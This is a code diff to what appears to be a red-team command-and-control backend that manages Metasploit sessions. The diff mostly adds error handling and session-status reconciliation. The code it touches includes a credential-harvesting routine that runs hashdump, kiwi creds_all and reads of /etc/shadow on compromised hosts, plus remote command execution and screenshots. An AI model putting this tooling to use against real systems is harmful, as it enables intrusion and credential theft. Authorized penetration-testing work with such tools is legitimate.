@@ -171,8 +171,9 @@ def list_sessions(project_id: Optional[str] = None, db: DBSession = Depends(get_
     if project_id:
         query = query.filter(C2Session.project_id == project_id)
     sessions = query.order_by(C2Session.established_at.desc()).all()
-    # Enrich with MSF live data
-    live = {s["msf_session_id"]: s for s in msf.list_sessions()}
+    # Enrich with MSF live data -- None means the RPC call itself failed, not
+    # that MSF genuinely has zero sessions; treat it as "unknown", not "none live".
+    live = {s["msf_session_id"]: s for s in (msf.list_sessions() or [])}
     result = []
     for s in sessions:
         d = {
@@ -203,15 +204,31 @@ def list_sessions(project_id: Optional[str] = None, db: DBSession = Depends(get_
 
 @router.post("/sessions/sync")
 def sync_msf_sessions(project_id: str, db: DBSession = Depends(get_db)):
-    """Pull live sessions from MSF and create Seraph records for new ones."""
+    """Pull live sessions from MSF: create records for new sessions, and
+    reconcile status/last_seen/tunnel_peer for ones already tracked. Previously
+    this only ever created -- a session that had drifted to status="lost"
+    (e.g. during a stale-RPC-token window) never got revived by sync, no
+    matter how many times you clicked it, because nothing here ever touched
+    an *existing* row."""
     live_sessions = msf.list_sessions()
+    if live_sessions is None:
+        raise HTTPException(502, "Could not reach Metasploit RPC — check /c2/status")
+
     created = []
+    updated = []
+    live_ids = {ls["msf_session_id"] for ls in live_sessions}
+
     for ls in live_sessions:
         existing = db.query(C2Session).filter(
             C2Session.msf_session_id == ls["msf_session_id"],
             C2Session.project_id == project_id,
         ).first()
-        if not existing:
+        if existing:
+            existing.status = "active"
+            existing.last_seen = datetime.utcnow()
+            existing.tunnel_peer = ls.get("tunnel_peer", existing.tunnel_peer)
+            updated.append(existing.id)
+        else:
             # Try to match target by IP
             remote_host = ls.get("remote_host", "")
             target = None
@@ -234,12 +251,23 @@ def sync_msf_sessions(project_id: str, db: DBSession = Depends(get_db)):
                 via_exploit=ls.get("via_exploit", ""),
                 via_payload=ls.get("via_payload", ""),
                 status="active",
+                last_seen=datetime.utcnow(),
                 checklist_json=json.dumps(_DEFAULT_CHECKLIST),
             )
             db.add(session)
             created.append(session.id)
+
+    # Only sessions MSF genuinely no longer reports (we got a real list back,
+    # not a failed call) may be marked lost.
+    db.query(C2Session).filter(
+        C2Session.project_id == project_id,
+        C2Session.status == "active",
+        C2Session.msf_session_id.isnot(None),
+        ~C2Session.msf_session_id.in_(live_ids) if live_ids else C2Session.msf_session_id.isnot(None),
+    ).update({"status": "lost"}, synchronize_session=False)
+
     db.commit()
-    return {"synced": len(live_sessions), "created": len(created)}
+    return {"synced": len(live_sessions), "created": len(created), "updated": len(updated)}
 
 
 class CreateSessionRequest(BaseModel):
@@ -335,7 +363,14 @@ def run_session_command(session_id: str, req: RunCommandRequest, db: DBSession =
     db.add(task)
     db.commit()
 
-    output = msf.session_run_command(session.msf_session_id, command, timeout=req.timeout)
+    try:
+        output = msf.session_run_command(session.msf_session_id, command, timeout=req.timeout)
+    except msf.MsfCommandError as e:
+        task.output = str(e)
+        task.status = "failed"
+        task.completed_at = datetime.utcnow()
+        db.commit()
+        raise HTTPException(502, str(e))
 
     task.output = output
     task.status = "done"
@@ -539,7 +574,7 @@ def start_listener(req: StartListenerRequest):
         extra_opts=req.extra_opts,
     )
     if "error" in result:
-        raise HTTPException(500, result["error"])
+        raise HTTPException(502, result["error"])
     return result
 
 
@@ -843,7 +878,10 @@ def harvest_credentials(session_id: str, db: DBSession = Depends(get_db)):
 
     if is_meterpreter and is_windows:
         # hashdump
-        out = msf.session_run_command(session.msf_session_id, "hashdump", timeout=30)
+        try:
+            out = msf.session_run_command(session.msf_session_id, "hashdump", timeout=30)
+        except msf.MsfCommandError:
+            out = ""
         if out:
             results.append(f"=== hashdump ===\n{out}")
             _save_raw("hashdump output", out)
@@ -867,9 +905,15 @@ def harvest_credentials(session_id: str, db: DBSession = Depends(get_db)):
                         ))
                         creds_saved += 1
         # kiwi
-        kiwi_out = msf.session_run_command(session.msf_session_id, "load kiwi", timeout=15)
+        try:
+            kiwi_out = msf.session_run_command(session.msf_session_id, "load kiwi", timeout=15)
+        except msf.MsfCommandError:
+            kiwi_out = ""
         if "success" in kiwi_out.lower() or "kiwi" in kiwi_out.lower():
-            creds_out = msf.session_run_command(session.msf_session_id, "creds_all", timeout=30)
+            try:
+                creds_out = msf.session_run_command(session.msf_session_id, "creds_all", timeout=30)
+            except msf.MsfCommandError:
+                creds_out = ""
             if creds_out:
                 results.append(f"=== kiwi creds_all ===\n{creds_out}")
                 _save_raw("kiwi creds_all output", creds_out)
@@ -894,7 +938,10 @@ def harvest_credentials(session_id: str, db: DBSession = Depends(get_db)):
         # Linux: read /etc/passwd and /etc/shadow
         for path, title in [("/etc/passwd", "passwd"), ("/etc/shadow", "shadow")]:
             cmd = f"cat {path}"
-            out = msf.session_run_command(session.msf_session_id, cmd, timeout=10)
+            try:
+                out = msf.session_run_command(session.msf_session_id, cmd, timeout=10)
+            except msf.MsfCommandError:
+                out = ""
             if out and "No such file" not in out and "Permission denied" not in out:
                 results.append(f"=== {path} ===\n{out}")
                 _save_raw(f"{title} dump", out, loot_type="userlist" if title == "passwd" else "hash")
@@ -921,7 +968,10 @@ def harvest_credentials(session_id: str, db: DBSession = Depends(get_db)):
         cmds = ["cat /etc/passwd 2>/dev/null", "cat /etc/shadow 2>/dev/null",
                 "find / -name '*.txt' -path '*/password*' 2>/dev/null | head -5"]
         for cmd in cmds:
-            out = msf.session_run_command(session.msf_session_id, cmd, timeout=10)
+            try:
+                out = msf.session_run_command(session.msf_session_id, cmd, timeout=10)
+            except msf.MsfCommandError:
+                out = ""
             if out and out.strip():
                 results.append(f"$ {cmd}\n{out}")
                 _save_raw(cmd, out, loot_type="userlist" if "passwd" in cmd else "hash")
@@ -1330,7 +1380,10 @@ def take_screenshot(session_id: str, db: DBSession = Depends(get_db)):
     if "meterpreter" not in (session.session_type or "").lower():
         raise HTTPException(400, "Screenshot requires a Meterpreter session")
 
-    out = msf.session_run_command(session.msf_session_id, "screenshot -q 50", timeout=30)
+    try:
+        out = msf.session_run_command(session.msf_session_id, "screenshot -q 50", timeout=30)
+    except msf.MsfCommandError as e:
+        raise HTTPException(502, str(e))
     if not out:
         raise HTTPException(500, "Screenshot command returned no output")
 
